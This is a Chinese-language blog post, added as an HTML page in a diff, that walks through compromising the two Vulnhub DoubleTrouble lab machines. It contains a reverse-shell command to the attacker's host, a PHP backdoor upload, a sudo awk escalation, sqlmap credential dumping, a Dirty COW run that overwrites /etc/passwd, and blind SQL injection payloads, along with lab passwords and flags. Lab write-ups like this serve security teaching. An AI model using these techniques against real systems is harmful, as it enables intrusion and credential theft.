@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="该靶机难度为简单，漏洞其实都不难发现，主要的难点在于第一台靶机隐写图片的发现和破解以及第二台靶机的sql注入漏洞的发现。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="13 Vulnhub DoubleTrouble Writeup">
+<meta property="og:url" content="https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/index.html">
+<meta property="og:site_name" content="HDFZZF&#39;s BLOG">
+<meta property="og:description" content="该靶机难度为简单，漏洞其实都不难发现，主要的难点在于第一台靶机隐写图片的发现和破解以及第二台靶机的sql注入漏洞的发现。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091054.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091209.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091401.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091804.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092027.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092814.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093052.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093153.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093326.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093801.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094017.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094403.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094543.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094824.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101134.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101313.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101933.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418102252.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418104149.png">
+<meta property="article:published_time" content="2022-04-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-04-18T02:46:50.161Z">
+<meta property="article:author" content="hdfzzf">
+<meta property="article:tag" content="综合">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="隐写术">
+<meta property="article:tag" content="开源CMS漏洞利用">
+<meta property="article:tag" content="GTFObins提权">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="脏牛提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091054.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/LOGO.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>13 Vulnhub DoubleTrouble Writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/04/18/0CTF%202016%20piapiapia/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/18/GYCTF2020%20FlaskApp/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E7%AC%AC%E4%B8%80%E5%8F%B0%E9%9D%B6%E6%9C%BA"><span class="toc-number">2.</span> <span class="toc-text">2 渗透——第一台靶机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E5%86%99%E6%9C%AF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 隐写术密码破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E7%AC%AC%E4%BA%8C%E5%8F%B0%E9%9D%B6%E6%9C%BA"><span class="toc-number">3.</span> <span class="toc-text">3 渗透——第二台靶机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1get-shell"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 访问http服务、get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-1"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">4 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 SQL注入——时间盲注</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        13 Vulnhub DoubleTrouble Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hdfzzf</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-17T16:00:00.000Z" itemprop="datePublished">2022-04-18</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/GTFObins%E6%8F%90%E6%9D%83/" rel="tag">GTFObins提权</a>, <a class="tag-link-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>, <a class="tag-link-link" href="/tags/vulnhub/" rel="tag">vulnhub</a>, <a class="tag-link-link" href="/tags/%E5%BC%80%E6%BA%90CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">开源CMS漏洞利用</a>, <a class="tag-link-link" href="/tags/%E7%BB%BC%E5%90%88/" rel="tag">综合</a>, <a class="tag-link-link" href="/tags/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/" rel="tag">脏牛提权</a>, <a class="tag-link-link" href="/tags/%E9%9A%90%E5%86%99%E6%9C%AF/" rel="tag">隐写术</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>该靶机难度为简单，漏洞其实都不难发现，主要的难点在于第一台靶机隐写图片的发现和破解以及第二台靶机的sql注入漏洞的发现。</p>
+<span id="more"></span>
+<h1 id="靶机信息">1 靶机信息</h1>
+<p>靶机地址：</p>
+<ul>
+<li>https://www.vulnhub.com/entry/doubletrouble-1,743/</li>
+</ul>
+<p>难度：</p>
+<ul>
+<li>简单</li>
+</ul>
+<p>目标：</p>
+<ul>
+<li>取得两台靶机root权限</li>
+<li>拿到两个flag</li>
+</ul>
+<p>涉及攻击方法：</p>
+<ul>
+<li>主机发现</li>
+<li>端口扫描</li>
+<li>Web信息收集</li>
+<li>开源CMS漏洞利用</li>
+<li>文件上传</li>
+<li>隐写术</li>
+<li>密码爆破</li>
+<li>GTFObins提权</li>
+<li>SQL盲注</li>
+<li><strong>脏牛提权</strong></li>
+</ul>
+<h1 id="渗透第一台靶机">2 渗透——第一台靶机</h1>
+<p>攻击主机kali: 10.0.2.4</p>
+<h2 id="主机发现端口扫描端口服务发现">2.1 主机发现、端口扫描、端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.17</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.17</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091054.png" /></p>
+<p>得到如下信息：</p>
+<ul>
+<li>22端口的服务为ssh</li>
+<li>80端口的服务为http，版本为Apache2.4.38</li>
+<li>靶机操作系统为Debian</li>
+</ul>
+<h2 id="访问http服务">2.2 访问http服务</h2>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091209.png" /></p>
+<p>得到一个登陆界面，经尝试，发现不知道邮箱无法登录，也不存在sql注入。但是下面的两行内容很奇怪，点击发现来到了<code>qdPM</code>官网，发现，这是一个开源的CMS，最新的版本是9.2，而靶机的是9.1，因而查看了一下更新日志，除了找到几个路径之外（路径扫描也能扫出来），没有其他收获。</p>
+<blockquote>
+<p>找到开源CMS的时候，需要查看一下更新的记录，里面有时候会记载类似“修复了xxx漏洞”信息。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091401.png" /></p>
+<p>搜索了一下该CMS的默认账号密码如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@localhost.com</span><br><span class="line">admin</span><br></pre></td></tr></table></figure></p>
+<p>但是无法登录。去GitHub上找了源码，但是检查了所有文件发现都没有任何有用的信息，链接如下：</p>
+<ul>
+<li>https://github.com/dodiksunaryo/qdpm</li>
+</ul>
+<p>最后，还是进行路径扫描，发现了许多文件（在查看源码的时候也看到了）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091804.png" /></p>
+<p>一一查看之后还是没有什么信息。<code>/secret</code>中放着一张图片，本来没什么重要的，但是这个目录的名字像是一个提示，因此联想到可能这张图片经过了隐写！</p>
+<h2 id="隐写术密码破解">2.3 隐写术密码破解</h2>
+<p>首先将图片下载到kali，然后使用<code>steghide</code>进行查看</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092027.png" /></p>
+<p>发现需要输入密码，因此进而确定该图片隐写了某些内容。此时利用一款新的工具<code>stegseek</code>，官网：</p>
+<ul>
+<li>https://github.com/RickdeJager/stegseek</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stegseek --seed doubletrouble.jpg <span class="comment"># 检测信息</span></span><br><span class="line">stegseek --crack doubletrouble.jpg rockyou.txt <span class="comment"># 提取信息</span></span><br></pre></td></tr></table></figure>
+<p>最后得到一个文件<code>doubletrouble.jpg.out</code>，查看其中的内容，得到两串字符： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">otisrush@localhost.com</span><br><span class="line">otis666</span><br></pre></td></tr></table></figure></p>
+<p>看这个格式像是之前登录界面的邮箱和密码，尝试登陆，发现进入了后台！</p>
+<h2 id="get-shell">2.4 get shell</h2>
+<p>这里有两种办法：</p>
+<ul>
+<li>第一种，利用msf搜索<code>searchsploit qdpm 9.1</code>，然后使用红框的exp即可（红框的是最新的，但是和前一个利用的是一样的漏洞。不过代码有点乱，需要自己整理一下） <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092814.png" /></li>
+<li>第二种，在后台我也找到了对应的文件上传点，可以直接上传后门，没有任何拦截</li>
+</ul>
+<p>接下来主要介绍第二种，第一种很简单，修改一下代码传到靶机执行就可以了。</p>
+<p>进入后台之后，我首先查看了配置里面的信息，发现了疑似文件上传点</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093052.png" /></p>
+<p>然后我上传了一个php文件，提示如下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093153.png" /></p>
+<p>但是问题是，没给上传文件的路径。这时候我想到了路径扫描的时候扫到了一个<code>/uploads</code>，就去查看了一下，功夫不负有心人，终于被我找到了，在<code>10.0.2.17/uploads/users</code>里面放着上传的文件（我还以为不成功，上传了许多次）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093326.png" /></p>
+<p>接下来直接蚁剑上线即可。</p>
+<h2 id="权限提升">2.5 权限提升</h2>
+<p>在蚁剑的shell上输入<code>nc -e /bin/bash 10.0.2.4 3333</code>将shell反弹到kali。可以升级一下shell（需要注意，靶机没有python3）。</p>
+<p>然后输入<code>sudo -l</code>查看的时候，发现了如下信息</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093801.png" /></p>
+<p>然后去了<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>发现了可以利用这个配置不当从而提权，命令如下： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094017.png" /></p>
+<p>查看<code>/root</code>发现了又一台虚拟机，先将该虚拟机传给kali，然后通过共享文件夹传到主机，最后再启动 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机: nc 10.0.2.4 4444 &lt; doubletrouble.ova -w 1 # 传输完1s后自动断开</span><br><span class="line">kali: nc -lvnp 4444 &gt; doubletrouble2.ova</span><br></pre></td></tr></table></figure></p>
+<h1 id="渗透第二台靶机">3 渗透——第二台靶机</h1>
+<h2 id="主机发现端口扫描端口服务发现-1">3.1 主机发现、端口扫描、端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.18</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.18</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094403.png" /></p>
+<p>信息如下：</p>
+<ul>
+<li>22端口的服务为ssh</li>
+<li>80端口的服务为http</li>
+<li>靶机的操作系统为Debian</li>
+<li><strong>Linux内核为3.x</strong></li>
+</ul>
+<h2 id="访问http服务get-shell">3.2 访问http服务、get shell</h2>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094543.png" /></p>
+<p>不论输入什么，这个页面都没有任何回应（就离谱，给我的感觉就是做了个登录界面，并没有登录这个功能）</p>
+<p>路径扫描也没有其他结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094824.png" /></p>
+<p>因此，漏洞只可能出现在登录界面，但是不论输入什么都没有任何反应。使用sqlmap，可以发现漏洞，因此直接用sqlmap扫： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r r.txt -p uname --dbs -&gt; doubletrouble, information_schema</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble --tables -&gt; users</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users --columns -&gt; username, password</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users -C username,password --dump</span><br></pre></td></tr></table></figure></p>
+<p>最终得到如下信息：</p>
+<table>
+<thead>
+<tr class="header">
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">montreux</td>
+<td style="text-align: center;">GfsZxc1</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">clapton</td>
+<td style="text-align: center;">ZubZub99</td>
+</tr>
+</tbody>
+</table>
+<p>然后去登陆界面登录，发现两个都登录不上。首先这不太可能是错误的消息，那么只有一种可能，那就是并不是登录界面的用户名和密码。在端口扫描中发现了22端口有着ssh服务，因此尝试连接，发现第二个用户和密码可以连接的上。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101134.png" /></p>
+<h2 id="权限提升-1">3.3 权限提升</h2>
+<p>首先查看了sudo配置，发现该靶机都没有sudo命令。suid权限也没有获得有用的信息。但是查看内核时发现，该靶机的Linux内核比较的老</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101313.png" /></p>
+<p>因此，可能存在内核漏洞，这里介绍脏牛漏洞<a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">dirty</a></p>
+<blockquote>
+<p>该漏洞利用dirtycow漏洞的pokemon漏洞利用作为基础，自动生成新的passwd行。运行二进制文件时，将提示用户输入新密码。然后将原始 /etc/passwd 文件备份到 /tmp/passwd.bak 并用生成的行覆盖 root 帐户。运行漏洞利用后，您应该能够使用新创建的用户登录。</p>
+</blockquote>
+<p>将exp放到靶机上，然后编译执行即可，注意要进入可读可写的目录，比如<code>/tmp</code>。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure></p>
+<p>然后需要输入新的密码。该漏洞会创建一个名为<code>firefart</code>的用户，但是拥有root权限</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101933.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418102252.png" /></p>
+<hr />
+<p>脏牛提权后，利用下述命令恢复原来的<code>/etc/passwd</code>： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure></p>
+<hr />
+<p>接下来查看两个flag，第一个在<code>/root/root.txt</code>，第二个在<code>/home/clapton/user.txt</code> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// root.txt</span><br><span class="line">1B8EEA89EA92CECB931E3CC25AA8DE21</span><br><span class="line"></span><br><span class="line">// user.txt</span><br><span class="line">6CEA7A737C7C651F6DA7669109B5FB52</span><br></pre></td></tr></table></figure></p>
+<p>靶机到此结束！</p>
+<h1 id="总结">4 总结</h1>
+<p>该靶机的难度确实不算难，不过还是存在着几个难点：</p>
+<ul>
+<li>第一台靶机的隐写术密码爆破</li>
+<li>第二台靶机的时间盲注的<strong>发现</strong></li>
+</ul>
+<p>我感觉第二台靶机只是做了一个登录界面，将我们输入的内容带入MySQL进行查询，不论结果对错，也不论是否有语法错误，都没有任何提示。现实情况下总会有不同的提示的，所以这里是一个难点。</p>
+<h2 id="sql注入时间盲注">4.1 SQL注入——时间盲注</h2>
+<p>如果后台语句为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;.$_POST[&quot;uname&quot;].&#x27; and password=&#x27;.$_POST[&quot;psw&quot;].&#x27;;</span><br></pre></td></tr></table></figure></p>
+<p>那么只需要<code>uname=1'and sleep(5)#&amp;psw=1</code>即可，此时： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;1&#x27;and sleep(5)#&#x27; and password=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure></p>
+<p>但是该靶机不行，此时小技巧： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; and(select x from (select (sleep(3)))alia)#</span><br></pre></td></tr></table></figure></p>
+<p>解释：</p>
+<p>此时，不论后台语句如何，至少存在 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; and(select x from(select (sleep(5)))alia)#</span><br></pre></td></tr></table></figure></p>
+<p>那么先查询<code>select (sleep(3))</code>，直接触发，然后将返回的结果起个别名<code>alia</code>，最后执行<code>select x from alia</code>，因为<code>alia</code>中必定不存在<code>x</code>，所以没有返回结果，因此最终呈现的效果就是页面返回的时间被延迟了。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418104149.png" /></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E7%AC%AC%E4%B8%80%E5%8F%B0%E9%9D%B6%E6%9C%BA"><span class="toc-number">2.</span> <span class="toc-text">2 渗透——第一台靶机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E5%86%99%E6%9C%AF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 隐写术密码破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E7%AC%AC%E4%BA%8C%E5%8F%B0%E9%9D%B6%E6%9C%BA"><span class="toc-number">3.</span> <span class="toc-text">3 渗透——第二台靶机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1get-shell"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 访问http服务、get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-1"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">4 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 SQL注入——时间盲注</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
